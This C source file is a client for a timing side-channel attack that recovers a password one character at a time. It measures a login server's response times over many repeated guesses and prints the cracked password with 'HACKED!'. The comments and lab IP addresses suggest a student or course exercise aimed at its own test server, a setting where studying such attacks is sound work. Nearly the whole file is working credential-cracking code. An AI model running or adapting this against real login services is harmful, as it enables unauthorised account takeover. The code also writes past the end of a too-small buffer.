#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

#define BUF_SIZE 256
#define PORT 39393

//add your own ip here if you'd like to test!
#define jason_ip "192.168.0.190"
#define shan_ip "192.168.1.46"
#define shan_linux_ip "128.252.167.161"
#define shan_lab_ip "192.168.122.1"
char* ip = shan_lab_ip; //change this to your ip

#define NUM_ITERS 200
#define NUM_CHARS 65
char CHARS[NUM_CHARS] = {'a','b','c','d','e','f','g','h','i',
                         'j','k','l','m','n','o','p','q','r',
                         's','t','u','v','w','x','y','z','A',
                         'B','C','D','E','F','G','H','I','J',
                         'K','L','M','N','O','P','Q','R','S',
                         'T','U','V','W','X','Y','Z','0','1',
                         '2','3','4','5','6','7','8','9','!',
                         '@','_'};
#define USERNAME "jason" //change this to whoever you'd like to hack

#define SUCCESS "Successfully logged in!" //server's success message

struct timespec req_before, req_after;
const int num_expected_args = 2;


//tests validity of username (user) and password (pass) pair
//sends these to server and checks response
//returns -1 if read from server fails
//returns -2 if the password is correct
//otherwise, returns time it takes for password to be verified by server
double test_creds(char* user, char* pass, int username_size, int password_size, int socket) {
    //send username
    int result;
    char response[BUF_SIZE];
    send(socket, user, username_size, 0);

    //wait for server before sending password
    if ((result = read(socket, response, sizeof(response))) == -1) {
        perror("read failed");
        return -1;
    } else if (result == 0) {
        perror("server closed");
        return -1;
    }

    //send password
    send(socket, pass, password_size, 0);
    clock_gettime(CLOCK_MONOTONIC, &req_before); //record time before
    result = read(socket, response, sizeof(response));
    clock_gettime(CLOCK_MONOTONIC, &req_after); //record time after

    if (result == -1) {
        perror("read failed");
        return -1;
    } else if (result == 0) {
        perror("server closed");
        return -1;
    }

    //check if password actually worked
    if (strcmp(response, SUCCESS) == 0) return -2;

    //calculate time taken by server to process password
    double ret = req_after.tv_nsec - req_before.tv_nsec;
    if (ret < 0) ret += 1000000000;
    return ret / 1000;
}

//continually guesses passwords
//adds characters when significant time difference is detected
//returns correct password
//loops infinitely if correct password is not found (this shouldn't happen)
char* perform_attack (int socket, char* username, int TIME_DIFFERENCE) {
    char* guess = malloc(BUF_SIZE);
    guess[0] = '\0'; //empty string not checked
    double test;
    double exec_time = TIME_DIFFERENCE;
    double accum;

    while(1) {
        char current_guess[strlen(guess) + 1];

        //run a series of tests for every letter CHARS
        for (int i = 0; i < NUM_CHARS; i++) {
            //append new character to current_guess
            strcpy(current_guess, guess);
            strncat(current_guess, &CHARS[i], 1);
            accum = 0;

            //average NUM_ITERS test results on this guess
            for (int j = 0; j < NUM_ITERS; j++) {
                test = test_creds(username, current_guess, strlen(username), strlen(current_guess), socket);
                if (test == -1) exit(EXIT_FAILURE);

                //return if guess is correct
                if (test == -2) {
                    strncat(guess, &CHARS[i], 1);
                    //printf("Found password: %s\n", guess);
                    return guess;
                }
                
                accum += test;
            }

            test = accum / NUM_ITERS;

            //check for significant time difference
            //update current_guess if detected
            if (test - exec_time > TIME_DIFFERENCE) {
                exec_time = test;
                strcpy(guess, current_guess);
                printf("current guess is %s\n", guess);
                break;
            }
        }
    }
}

int main(int argc, char const* argv[]) {
    if (argc != num_expected_args) {
        printf("Usage: ./client_test <TIME_DIFFERENCE (us)>\n");
        exit(EXIT_FAILURE);
    }

    int TIME_DIFFERENCE = atoi(argv[1]);
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
	    perror("Error in init_pton");
	    exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Failed to connect");
	    exit(EXIT_FAILURE);
    }

    printf("connected\n");

    //run attack and print result
    char* password = perform_attack(sock, USERNAME, TIME_DIFFERENCE);
    printf("Password for jason is %s. HACKED!\n", password);
    free(password);

    close(sock);
    return 0;
}
